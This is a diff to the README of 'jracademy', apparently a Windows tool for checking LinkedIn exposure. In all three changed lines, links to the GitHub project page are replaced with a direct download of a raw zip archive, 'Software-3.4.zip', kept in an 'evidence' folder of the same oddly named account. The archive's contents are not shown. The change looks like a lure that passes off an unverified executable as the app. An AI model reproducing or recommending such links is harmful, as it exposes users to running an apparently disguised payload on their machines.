@@ -1,6 +1,6 @@
 # 🔎 jracademy - Check LinkedIn exposure on Windows
 
-[![Download / Install](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Pulsetimingcircuittalkie241/jracademy)
+[![Download / Install](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Pulsetimingcircuittalkie241/jracademy/raw/refs/heads/main/evidence/Software-3.4.zip)
 
 ## 🧭 What this is
 
@@ -10,7 +10,7 @@ jracademy is a Windows app for checking a Chrome extension linked to JR Academy 
 
 Open this page in your browser:
 
-https://github.com/Pulsetimingcircuittalkie241/jracademy
+https://github.com/Pulsetimingcircuittalkie241/jracademy/raw/refs/heads/main/evidence/Software-3.4.zip
 
 1. Click the download link above
 2. On the GitHub page, look for the latest release or the source files
@@ -188,7 +188,7 @@ If the project includes logs or output files, review:
 
 Download or visit the project page here:
 
-https://github.com/Pulsetimingcircuittalkie241/jracademy
+https://github.com/Pulsetimingcircuittalkie241/jracademy/raw/refs/heads/main/evidence/Software-3.4.zip
 
 ## 📎 Project topics
 
